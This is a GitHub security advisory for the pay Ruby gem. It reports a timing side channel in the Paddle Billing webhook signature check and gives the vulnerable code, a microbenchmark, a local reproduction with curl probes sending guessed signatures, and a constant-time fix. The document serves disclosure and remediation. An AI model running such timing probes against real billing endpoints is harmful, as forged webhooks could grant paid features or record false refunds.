# [H] pay-rails/pay: non-constant-time HMAC comparison in Paddle Billing webhook signature verifier

## Summary
Severity: High
Advisory: GHSA-mjgf-xj26-9qf9
CWE: CWE-208
Ecosystem: RubyGems
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-07-01
Source: https://github.com/advisories/GHSA-mjgf-xj26-9qf9
Type: github-advisory

## Affected
- RubyGems: `pay` — affected >=0

## Details
## Summary

`Pay::Webhooks::PaddleBillingController#valid_signature?` (`app/controllers/pay/webhooks/paddle_billing_controller.rb`) verifies the Paddle Billing webhook signature by computing `OpenSSL::HMAC.hexdigest(...)` and comparing it to the attacker-supplied header value using Ruby's `String#==`. Ruby's `==` is non-constant-time — it returns as soon as the first byte mismatches — and exposes a per-byte timing side channel on the webhook signature verification path. The canonical mitigation is to use a constant-time primitive (`OpenSSL.fixed_length_secure_compare` / `ActiveSupport::SecurityUtils.secure_compare`).

## Impact

- **CWE-208** — Observable Timing Discrepancy on the webhook signature verifier.
- An attacker who can deliver requests to the `/pay/webhooks/paddle_billing` mount point can probe the verifier with guessed `Paddle-Signature` header values. Because `String#==` short-circuits on the first mismatching byte, the response-time distribution shifts as the prefix of the guess matches the real hex digest.
- A signature recovered through the oracle lets the attacker deliver forged Paddle Billing webhook events (e.g. `subscription.created` / `transaction.completed`) against the host application. Pay's webhook processor enqueues a `Pay::Webhooks::ProcessJob` for any accepted webhook, which downstream applications use to update billing state — including provisioning paid features, recording refunds, and triggering customer notifications.
- The endpoint is internet-reachable by definition (Paddle must POST events to it).

## Affected versions

`pay` (rubygem) ≤ v11.6.1 (latest release as of 2026-05-27).

## Vulnerable code (file:line)

`app/controllers/pay/webhooks/paddle_billing_controller.rb`:

```ruby
24:      def valid_signature?(paddle_signature)
25:        return false if paddle_signature.blank?
26:
27:        ts_part, h1_part = paddle_signature.split(";")
28:        _, ts = ts_part.split("=")
29:        _, h1 = h1_part.split("=")
30:
31:        signed_payload = "#{ts}:#{request.raw_post}"
32:
33:        key = Pay::PaddleBilling.signing_secret
34:        data = signed_payload
35:        digest = OpenSSL::Digest.new("sha256")
36:
37:        hmac = OpenSSL::HMAC.hexdigest(digest, key, data)
38:        hmac == h1                          # <-- non-constant-time '=='
39:      end
```

`hmac` is the 64-character hex-encoded SHA-256 HMAC of `"<ts>:<raw_post>"` under the application's configured Paddle Billing signing secret. The comparison with `h1` (the attacker-supplied `h1=` token from the `Paddle-Signature` header) uses Ruby's native `String#==`, which is implemented in MRI as `rb_str_equal` and returns immediately on the first byte mismatch.

## How an attacker reaches this code

1. Any Pay-using Rails application mounting `Pay::Engine` exposes `POST /pay/webhooks/paddle_billing` to the public internet (Paddle requires the endpoint to be reachable). The controller is configured by default in `config/routes.rb` when `paddle_billing` is enabled.
2. The controller's `before_action :verify_signature` invokes `valid_signature?` on every inbound request.
3. An attacker repeatedly POSTs forged webhook payloads with `Paddle-Signature: ts=<now>;h1=<guess>` headers and measures the response time. The verifier returns early on the first mismatching byte of the hex digest; with a sufficient probe count per byte position, response-time distribution reveals when the prefix of `<guess>` matches the real `hmac`.
4. A signature recovered through the oracle lets the attacker forge arbitrary Paddle Billing webhook deliveries.

## Proof of concept (microbenchmark)

Local Ruby microbenchmark isolating the verifier comparison path:

```ruby
require 'openssl'
require 'benchmark'
require 'securerandom'

key = SecureRandom.hex(32)
payload = '1730000000:{"event_type":"transaction.completed"}'
real_hmac = OpenSSL::HMAC.hexdigest(OpenSSL::Digest.new('sha256'), key, payload)
puts "real_hmac=#{real_hmac}"

def verify(real, guess)
  real == guess     # mirrors paddle_billing_controller.rb:38
end

guesses = {
  'all-wrong'    => ('0' * real_hmac.length),
  'match-1byte'  => real_hmac[0..0]  + '0' * (real_hmac.length - 1),
  'match-32byte' => real_hmac[0..31] + '0' * (real_hmac.length - 32),
  'match-63byte' => real_hmac[0..62] + '0',
  'exact-match'  => real_hmac.dup,
}
iters = 10_000_000
3.times { guesses.each_value { |g| 1_000_000.times { real_hmac == g } } }  # warmup
guesses.each do |label, g|
  t = Benchmark.realtime { iters.times { real_hmac == g } }
  puts "#{label.ljust(15)} avg_ns=#{(t * 1e9 / iters).round}"
end
```

This isolates the same `String#==` path used by `valid_signature?`. The static defect is verifiable by `bundle show pay` and reading line 38 of the controller.

## End-to-end reproduction against `gem install pay --version 11.6.1`

Minimal Rails 8 app mounting `Pay::Engine` with `paddle_billing` enabled:

```bash
gem install rails -v 8.0.2
rails new payapp --skip-test --skip-bundle
cd payapp
echo "gem 'pay', '11.6.1'" >> Gemfile
echo "gem 'paddle', '~> 2.0'" >> Gemfile
bundle install
bin/rails g pay:install
# config/initializers/pay.rb adds Pay.setup, paddle_billing config
# config/routes.rb already has 'mount Pay::Engine => "/pay"' from generator

bin/rails server &

# attacker probes the webhook endpoint
WEBHOOK="http://127.0.0.1:3000/pay/webhooks/paddle_billing"
BODY='{"event_type":"transaction.completed","data":{}}'
TS=$(date +%s)
# Try guesses with different prefix-match counts; response-time delta is the oracle
for guess in 0000000000000000000000000000000000000000000000000000000000000000 \
             a000000000000000000000000000000000000000000000000000000000000000 ; do
  for _ in 1 2 3; do
    curl -s -w '%{time_total}\n' -o /dev/null \
      -X POST -H "Paddle-Signature: ts=$TS;h1=$guess" \
      -H 'Content-Type: application/json' -d "$BODY" "$WEBHOOK"
  done
done
```

The static defect is verifiable by:

```
$ bundle show pay
.../gems/pay-11.6.1
$ sed -n '38p' .../gems/pay-11.6.1/app/controllers/pay/webhooks/paddle_billing_controller.rb
        hmac == h1
```

After the fix is applied, the verifier uses `ActiveSupport::SecurityUtils.secure_compare`, which compares all bytes regardless of mismatch position, and the timing oracle closes.

## Suggested fix

Replace `==` with `ActiveSupport::SecurityUtils.secure_compare` (Pay is a Rails engine, so ActiveSupport is always available).

```diff
       def valid_signature?(paddle_signature)
         return false if paddle_signature.blank?
 
         ts_part, h1_part = paddle_signature.split(";")
         _, ts = ts_part.split("=")
         _, h1 = h1_part.split("=")
 
         signed_payload = "#{ts}:#{request.raw_post}"
 
         key = Pay::PaddleBilling.signing_secret
         data = signed_payload
         digest = OpenSSL::Digest.new("sha256")
 
         hmac = OpenSSL::HMAC.hexdigest(digest, key, data)
-        hmac == h1
+        return false if h1.nil? || hmac.bytesize != h1.bytesize
+        ActiveSupport::SecurityUtils.secure_compare(hmac, h1)
       end
```

The bytesize-equality guard ensures `secure_compare` does not return early on a length mismatch (it falls back to `==` if lengths differ on older Rails versions). For the Paddle Billing signing format the hex tag is a fixed 64 chars.

## Credit

Reported by tonghuaroot (https://github.com/tonghuaroot).

## References
- https://github.com/pay-rails/pay/security/advisories/GHSA-mjgf-xj26-9qf9
- https://github.com/pay-rails/pay
